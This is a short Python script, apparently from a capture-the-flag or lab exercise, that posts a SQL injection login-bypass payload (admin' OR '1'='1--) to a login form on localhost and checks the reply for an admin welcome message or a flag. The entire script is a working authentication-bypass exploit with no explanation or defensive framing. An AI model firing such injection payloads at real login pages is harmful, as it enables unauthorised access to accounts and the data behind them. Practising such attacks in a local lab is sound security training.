import httpx

response = httpx.post('http://localhost:8000/login', data="username=admin' OR '1'='1--&password=anything")
print('Response length:', len(response.text))
print('Contains Welcome Admin:', 'Welcome Admin' in response.text)
print('Contains flag:', 'flag' in response.text.lower())
print('First 300 chars:', response.text[:300])
